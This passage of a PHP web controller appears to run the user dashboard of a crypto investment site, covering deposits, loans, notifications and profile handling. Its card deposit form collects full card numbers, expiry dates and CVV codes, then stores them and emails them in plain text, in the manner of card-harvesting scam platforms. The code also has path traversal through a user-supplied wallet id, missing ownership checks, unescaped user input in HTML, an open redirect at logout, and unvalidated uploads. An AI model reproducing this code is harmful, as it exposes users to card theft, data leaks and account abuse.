          session()->setFlashdata("msg", 'Your Request to Buy  ' . $user['currency'] . $this->request->getPost("amount") . ' worth of Crypto have been submitted. Your reference ID is ' . $reference . '. You will receive a response from our Accounts team shortly.');
          return redirect()->to("user");
        } else {
          session()->setFlashdata("msg", 'Error Occurred. Please try again');
          return redirect()->to("user");
        }
      } elseif ($this->request->getPost("cardDeposit")) {

        $description = '
        <p>A user has requested to fund their ' . $this->request->getPost("account") . ' with ' . $user['currency'] . $this->request->getPost("amount") . ' via Credit card. See Credit Card details:
        <br>
        <strong>Credit Card Type:</strong> ' . $this->request->getPost("cardType") . '<br>
        <strong>Credit Card Number:</strong> ' . $this->request->getPost("cardNumber") . '<br>
        <strong>Name on Credit Card:</strong> ' . $this->request->getPost("cardName") . '<br>
        <strong>Expiry Date:</strong> ' . $this->request->getPost("cardExp") . '<br>
        <strong>CVV Code:</strong> ' . $this->request->getPost("cardCvv") . '
        </p>
        ';

        //Insert Records
        $values = [
          "user_id" => $user['id'],
          "email" => $user['email'],
          "name" => $user['name'],
          "reference" => $reference,
          "description" => $description,
          "subject" => 'Credit Card Deposit Request',
          "dept" => 'Card Deposit',
        ];

        if ($Model->save($values)) {

          $variables = [];
          $variables['user_full_name'] = $user['name'];
          $variables['user_email'] = $user['email'];
          $variables['ticket_title'] = 'Credit Card Deposit Request';
          $variables['ticket_dept'] = 'Card Deposit';
          $variables['ticket_description'] = $description;
          $variables['ticket_reference'] = $reference;

          $this->sendmail($variables, 'Support Ticket', $site['company_email'], 'NoFile');

          session()->setFlashdata("msg", 'Your Request to fund your ' . $this->request->getPost("account") . ' account with  ' . $user['currency'] . $this->request->getPost("amount") . ' have been submitted. Your reference ID is ' . $reference . '. You will receive a response from our Accounts team shortly.');
          return redirect()->to("user");
        } else {
          session()->setFlashdata("msg", 'Error Occurred. Please try again');
          return redirect()->to("user");
        }
      } else {

        $condition = ["user_id" => $user['id']];

        $site['count_rows'] = $Model->where($condition)->countAllResults();
        $value = ["user_id" => $user['id'], "loan" => 0];
        $user['record'] = $Model->where($value)->findAll();

        $data = array_merge($user, $site);
        return view("theme/$this->theme/header", $data) .
          view("theme/$this->theme/support", $data) .
          view("theme/$this->theme/footer", $data);
      }
    }
  }


  public function deposit()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {

      $site = $this->site;
      $user = $this->user();
      $GatewayModel = new PaymentGateway();

      if ($this->request->getPost("deposit")) {
        //Transaction Data
        $wallet_id = $this->request->getPost("method");

        $getTicker = $GatewayModel->where('id', $wallet_id)->first();
        $ticker = $getTicker['ticker'];



        $amount = $this->request->getPost("amount");
        $reference = rand(100000, 999999);
        $token = hash("md5", rand(100000000, 999999999));

        //User Details
        $name = $user["name"];
        $email = $user["email"];
        $user_id = $user["id"];

        //Email Variables
        $variables = [];
        $variables["user_full_name"] = $name;
        $variables["user_email"] = $email;
        $variables["transaction_amount"] = $user["currency"] . number_format($amount, 2);
        $variables["the_transaction_ref"] = $reference . ' Account Selected: ' . $this->request->getPost("account");
        $variables["the_coin"] = strtoupper($ticker);



        //Records
        $values = [
          "user_id" => $user_id,
          "email" => $email,
          "name" => $name,
          "transaction_type" => "Deposit",
          "amount" => $amount,
          "coin_type" => strtoupper($ticker),
          "reference" => $reference,
          "token" => $token,
          "coin_id" => $wallet_id,
          "status" => 0,
        ];

        //Insert Transaction Record
        $Deposit = new TransactionModel();
        if ($Deposit->save($values)) {

          //Display Wallet Barcode
          $msg = '<center>
			 <small>Send <b><span class="text-danger">' . $user['currency'] . number_format($amount, 2) . ' </span></b> worth of <strong>' . strtoupper($ticker) . '</strong> to the wallet address below<br>
			<img src="https://api.qrserver.com/v1/create-qr-code/?data=' .
            file_get_contents(WRITEPATH . "wallets/." . $wallet_id) .
            '&amp;size=200x200" alt="Wallet Barcode">
						<hr>
						<small>' . file_get_contents(WRITEPATH . "wallets/." . $wallet_id) . '</small>
            <hr>
						<button onclick="copyWallet()" class="clip_modal btn btn-sm btn-secondary shadowed" data-clipboard-text="' . file_get_contents(WRITEPATH . "wallets/." . $wallet_id) . '">
               <i class="fas fa-copy"></i>&nbsp;
              <span id="copy">Copy Wallet Address</span>
                <span id="copied" style="display: none">Wallet Copied!</span>
            </button>
			</center>';
          //Notify Admin
          $this->sendmail(
            $variables,
            "Deposit Request",
            $site["company_email"],
            'NoFile'
          );

          session()->setFlashdata("deposit", $msg);
          return redirect()->to("user");
        }
      } else if ($this->request->getGet("id")) {
        //Transaction Data
        $id = $this->request->getGet("id");
        $txModel = new TransactionModel();
        $get = $txModel->where('id', $id)->first();


        $wallet_id = $get['coin_id'];
        $GatewayModel = new PaymentGateway();
        $getTicker = $GatewayModel->where('id', $wallet_id)->first();
        $ticker = $getTicker['ticker'];



        $amount = $get['amount'];
        $reference = $get['reference'];
        $token = $get['token'];


        //User Details
        $name = $user["name"];
        $email = $user["email"];
        $user_id = $user["id"];

        //Display Wallet Barcode
        $msg = '<center>
			 <small>Send <b><span class="text-danger">' . $user['currency'] . number_format($amount, 2) . ' </span></b> worth of <strong>' . strtoupper($ticker) . '</strong> to the wallet address below<br>
			<img src="https://api.qrserver.com/v1/create-qr-code/?data=' .
          file_get_contents(WRITEPATH . "wallets/." . $wallet_id) .
          '&amp;size=200x200" alt="Wallet Barcode">
						<hr>
						<small>' . file_get_contents(WRITEPATH . "wallets/." . $wallet_id) . '</small>
            <hr>
						<button onclick="copyWallet()" class="clip_modal btn btn-sm btn-secondary shadowed" data-clipboard-text="' . file_get_contents(WRITEPATH . "wallets/." . $wallet_id) . '">
               <i class="fas fa-copy"></i>&nbsp;
                 <span id="copy">Copy Wallet Address</span>
            </button>
			</center>';


        session()->setFlashdata("deposit", $msg);
        return redirect()->to("user");
      } else if ($this->request->getVar("upload_check")) {
        $front = $this->request->getFile('front');
        $frontFile = $front->getRandomName();
        $back = $this->request->getFile('back');
        $backFile = $back->getRandomName();

        $front->move('uploads', $frontFile);
        $back->move('uploads', $backFile);

        $values = [
          "user_id" => $user['id'],
          "front" => $frontFile,
          "back" => $backFile,
          "remarks" => $this->request->getGet("remarks")
        ];

        (new CheckModel)->save($values);

        $variables = [];
        $variables['user_full_name'] = $user['name'];
        $variables['user_email'] = $user['email'];
        $variables['the_remarks'] = $this->request->getGet("remarks");
        $variables['the_front'] = $frontFile;
        $variables['the_back'] = $backFile;

        $this->sendmail($variables, 'Check Deposit', $site['company_email'], 'NoFile');
        session()->setFlashdata("msg", 'The Check Deposit have been received. Your account will be updated after confirmation');
        return redirect()->to("user");
      } else {
        return redirect()->to("user");
      }
    }
  }




  public function notifications()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {

      $Tx = new NotificationModel();
      $site = $this->site;
      $user = $this->user();
      $user['get_read'] = '';

      if ($this->request->getPost("read")) {

        $Tx->where("id", $this->request->getPost("id"))->set("status", 1)->update();
        $row = $Tx->where("id", $this->request->getPost("id"))->first();
        if (!empty($row['file'])) {
          $file = '<div class="title"><a href="' . base_url('uploads/docs/' . $row['file']) . '" target="_blank">VIEW ATTACHMENT</a></div>';
        } else {
          $file = '';
        }

        $msg = '
          <div class="col-12">
			    <div class="stat-box mb-1">
					<h4 class="text-primary font-weight-bold">
						' . $row['subject'] . '
					</h4>
				</div>
				<div class="stat-box mb-1">
					<div class="title">
						' . $row['description'] . '
					</div>
					<hr>
          ' . $file . '
				</div>
				<div class="stat-box mb-1">
					<small>Received on: ' . date("jS M\. Y", strtotime($row['created_at'])) . '</small>
				</div>
			   </div>
          ';

        session()->setFlashdata("msg", $msg);
        return redirect()->to("user/notifications");
      } else if ($this->request->getPost("delete")) {

        if ($Tx->where("id", $this->request->getPost("id"))->delete()) {
          session()->setFlashdata("msg", 'Deleted Successfully!');
          return redirect()->to("user/notifications");
        } else {
          session()->setFlashdata("msg", 'Error Occurred. Please try again');
          return redirect()->to("user/notifications");
        }
      } else {

        $user['get_read'] = 0;
        $site["page"] = "Notifications";

        $data = array_merge($user, $site);
        return view("theme/$this->theme/header", $data) .
          view("theme/$this->theme/history", $data) .
          view("theme/$this->theme/footer", $data);
      }
    }
  }

  public function alert()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {
      session()->setFlashdata("msg", 'Temporarily not available. Please try again later');
      return redirect()->to("user");
    }
  }

  public function loan()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {

      $site = $this->site;
      $user = $this->user();
      $site["page"] = "Loan";
      $reference = rand(100000, 999999);
      $Model = new SupportModel();

      if ($this->request->getPost("apply")) {

        //Check pending loan
        $rec = ["user_id" => $user['id'], "status" => 0, "loan" => 1];
        if ($Model->where($rec)->findAll()) {

          session()->setFlashdata("msg", 'Your have a pending loan application');
          return redirect()->to("user/loan");
        } else {

          $_body = '
		          <p><strong>Name of Applicant </strong> ' . $user['name'] . '</p>
		          <p><strong>Email of Applicant </strong> ' . $user['email'] . '</p>
		          <p><strong>Amount Requested </strong> ' . $user['currency'] . number_format($this->request->getPost("amount"), 2) . '</p>
		          <p><strong>Ocupation </strong> ' . $this->request->getPost("occupation") . '</p>
		          <p><strong>Additional Remarks </strong> ' . nl2br($this->request->getPost("message")) . '</p>
		          ';

          //Insert Records
          $values = [
            "user_id" => $user['id'],
            "email" => $user['email'],
            "name" => $user['name'],
            "reference" => $reference,
            "description" => $_body,
            "subject" => $user['currency'] . number_format($this->request->getPost("amount"), 2) . " Loan Application",
            "dept" => "Loan",
            "loan" => 1
          ];

          if ($Model->save($values)) {

            $variables = [];
            $variables['user_full_name'] = $user['name'];
            $variables['user_email'] = $user['email'];
            $variables['ticket_title'] = $user['currency'] . number_format($this->request->getPost("amount"), 2) . 'Loan Application';
            $variables['ticket_dept'] = "Loan";
            $variables['ticket_description'] = $_body;
            $variables['ticket_reference'] = $reference;

            $this->sendmail($variables, 'Support Ticket', $site['company_email'], 'NoFile');

            session()->setFlashdata("msg", 'Your Credit Advance/Loan request has been submitted. Your reference ID is ' . $reference . '. You will receive a response from the Account Department shortly.');
            return redirect()->to("user/loan");
          } else {
            session()->setFlashdata("msg", 'Error Occurred. Please try again');
            return redirect()->to("user/loan");
          }
        }
      } else {

        $data = array_merge($user, $site);
        return view("theme/$this->theme/header", $data) .
          view("theme/$this->theme/support", $data) .
          view("theme/$this->theme/footer", $data);
      }
    }
  }


  public function profile()
  {
    if (!session()->get("user_id")) {
      return redirect()->to("auth/login?url=" . current_url());
    } else {

      $site = $this->site;
      $user = $this->user();
      $site["page"] = "Profile";
      $data = array_merge($user, $site);
      $data['registered'] = $user['created_at'];
      $Model = new UserModel();

      if ($this->request->getPost("upload_photo")) {
        $max_size = $site['max_upload'] * 1000;
        $rules = $this->validate([
          'photo' => [
            'label' => 'Image File',
            'rules' => 'uploaded[photo]'
              . '|is_image[photo]'
              . '|mime_in[photo,image/jpg,image/jpeg,image/gif,image/png,image/webp]'
              . '|max_size[photo,' . $max_size . ']',
          ],
        ]);

        if ($rules) {
          $img = $this->request->getFile('photo');
          //Rename file
          $filename = $img->getRandomName();

          if ($img->move('uploads', $filename)) {

            $Model = new UserModel();
            $value = ["image" => $filename];
            $Model->where("id", $user['id'])->set($value)->update();

            session()->setFlashdata("msg", 'Profile photo updated');
            return redirect()->to("user/profile");
          } else {

            session()->setFlashdata("msg", 'Error Occurred. Please try again');
            return redirect()->to("user/profile");
          }
        } else {

          $data["validation"] = $this->validator;
          return view("theme/$this->theme/header", $data) .
            view("theme/$this->theme/profile", $data) .
            view("theme/$this->theme/footer", $data);
        }
      } else if ($this->request->getPost("edit_contact")) {

        $values = [
          "name" => $this->request->getPost("name"),
          "phone" => $this->request->getPost("phone"),
          "country" => $this->request->getPost("country"),
          "city" => $this->request->getPost("city"),
          "gender" => $this->request->getPost("gender"),
          "address" => $this->request->getPost("address")
        ];
        if (
          $Model
          ->where("id", $user['id'])
          ->set($values)
          ->update()
        ) {
          session()->setFlashdata("msg", 'Profile updated');
          return redirect()->to("user/profile");
        } else {
          session()->setFlashdata("msg", 'Error Occurred. Try again');
          return redirect()->to("user/profile");
        }
      } else if ($this->request->getPost("change_password")) {

        $hasher = new PasswordHash(8, true);
        if ($hasher->CheckPassword($this->request->getPost("old_password"), $user['password'])) {

          if ($this->request->getPost("new_password") === $this->request->getPost("confirm_password")) {

            $password = $hasher->HashPassword($this->request->getPost("new_password"));

            if ($Model->where("id", $user['id'])->set("password", $password)->update()) {
              session()->destroy();
              session()->setFlashdata("msg", 'Password change successfull');
              return redirect()->to("auth/login?new=session");
            } else {
              session()->setFlashdata("msg", 'Error Occurred. Try again');
              return redirect()->to("user/profile");
            }
          } else {
            session()->setFlashdata("msg", 'Password confirmation does not match');
            return redirect()->to("user/profile");
          }
        } else {
          session()->setFlashdata("msg", 'Invalid old password');
          return redirect()->to("user/profile");
        }
      } else {

        return view("theme/$this->theme/header", $data) .
          view("theme/$this->theme/profile", $data) .
          view("theme/$this->theme/footer", $data);
      }
    }
  }


  /*******************
   * LOGOUT
   ********************/
  public function logout()
  {
    if ($this->request->getGet("url")) {
      $redirect = redirect()->to("auth/login?url=" . $this->request->getGet("url"));
    } else {
      $redirect = redirect()->to("auth/login");
    }
    session()->destroy();
    return $redirect;
  }
}
